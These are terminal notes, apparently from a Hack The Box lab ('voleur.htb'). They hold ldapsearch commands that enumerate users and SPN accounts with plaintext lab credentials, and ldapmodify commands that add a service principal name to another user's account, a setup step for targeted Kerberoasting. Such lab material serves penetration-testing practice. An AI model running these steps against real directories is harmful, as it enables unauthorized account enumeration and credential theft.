

┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -H ldap://10.10.11.76 \
-D 'ryan.naylor@voleur.htb' -w 'HollowOct31Nyt' \
-b 'DC=voleur,DC=htb' \
'(objectClass=user)' \
sAMAccountName


┌──(kali㉿kali)-[~]
└─$ ldapsearch -x \
  -H ldap://192.168.3.100 \
  -D "Administrator@naka.local" \
  -w 'Nakahara0216' \
  -b "DC=naka,DC=local" \
  "(servicePrincipalName=*)"


┌──(kali㉿kali)-[~/HTB/voleur]
└─$ ldapmodify -x \
  -H ldap://10.10.11.76 \
  -D 'CN=SVC_LDAP,OU=SERVICE ACCOUNTS,DC=VOLEUR,DC=HTB'\
  -w 'M1XyC9pW7qT5Vn' \
  -f add_spn.ldif

ldapmodify -x -H ldap://10.10.11.76 \
  -D 'svc_ldap@voleur.htb' -w 'M1XyC9pW7qT5Vn' \
  -f addspn.ldif                                                                                 

modifying entry "CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb"